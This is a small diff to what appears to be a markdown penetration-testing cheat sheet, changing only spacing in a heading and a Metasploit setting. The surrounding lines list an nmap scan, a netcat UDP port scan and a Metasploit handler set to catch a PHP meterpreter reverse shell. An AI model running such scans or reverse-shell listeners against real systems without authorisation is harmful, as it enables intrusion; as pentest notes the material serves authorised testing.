@@ -12,7 +12,7 @@
 #### NMAP Scan
 - `sudo nmap -sC -sV -oA testbox 10.0.0.1`
 
-####Other type scans
+#### Other type scans
 - `nc -nv -u -z -w 1 192.168.1.44 1300-1500`
 
 ### Web Directory Enumeration
@@ -69,7 +69,7 @@
 - `use exploit/multi/handler`
 - `set payload php/meterpreter_reverse_tcp`
 - `set LHOST 10.0.0.1`
-- `set LPORT  9998`
+- `set LPORT 9998`
 - `run`
 
 ###### Reverse shells
